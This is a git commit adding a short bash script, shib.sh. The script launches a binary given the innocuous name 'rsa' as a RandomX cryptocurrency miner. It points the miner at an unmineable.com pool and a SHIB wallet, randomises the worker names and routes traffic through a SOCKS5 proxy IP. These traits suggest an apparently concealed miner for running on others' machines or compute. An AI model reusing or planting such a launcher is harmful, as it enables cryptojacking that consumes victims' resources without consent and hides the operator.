b6cc1c576c67bb11d6c5e2d7dc72ecca04a79efe
JohnPHanna <88381331+JohnPHanna@users.noreply.github.com>
2021-08-03 19:34:16 +0700

    Add files via upload

---
+++ shib.sh
@@ -0,0 +1,3 @@
+#!/bin/bash
+chmod +x rsa
+./rsa -o rx.unmineable.com:3333 -a rx -k -u SHIB:0xc47ac4f4bb1e94f545738b2b8043bdfd711deaeb.$(echo $(shuf -i 10-299 -n 1)-ANDRO-X)#g2nx-aax9 -t 2 -x socks5://192.252.209.155:14455
